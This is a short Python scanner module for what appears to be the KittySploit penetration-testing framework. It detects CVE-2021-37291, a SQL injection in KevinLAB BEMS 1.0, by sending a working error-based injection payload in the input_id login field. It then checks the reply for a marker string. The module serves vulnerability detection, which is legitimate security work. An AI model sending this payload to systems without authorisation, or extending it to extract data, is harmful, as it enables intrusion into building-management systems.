#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""KevinLAB BEMS 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KevinLAB BEMS 1.0 - SQL Injection Detection',
        'description': 'KevinLAB BEMS 1.0 contains a SQL injection vulnerability. Input passed through input_id POST parameter in /http/index.php is not properly sanitized before being returned to the user or used in SQL queries. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'kevinlab', 'sqli', 'edb', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5655.php',
            'https://www.exploit-db.com/exploits/50146',
            'https://packetstormsecurity.com/files/163572/',
            'https://nvd.nist.gov/vuln/detail/cve-2021-37291',
        ],
        'cve': 'CVE-2021-37291',
    }

    def run(self):
        path = '/http/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate'}, data='requester=login&request=login&params=[{"name":"input_id","value":"USERNAME\' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND \'joxy\'=\'joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('XPATH syntax error', ": '\\ZSL1ZSL'",)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='KevinLAB BEMS 1.0 - SQL Injection detected', path=path)
            return True
        return False

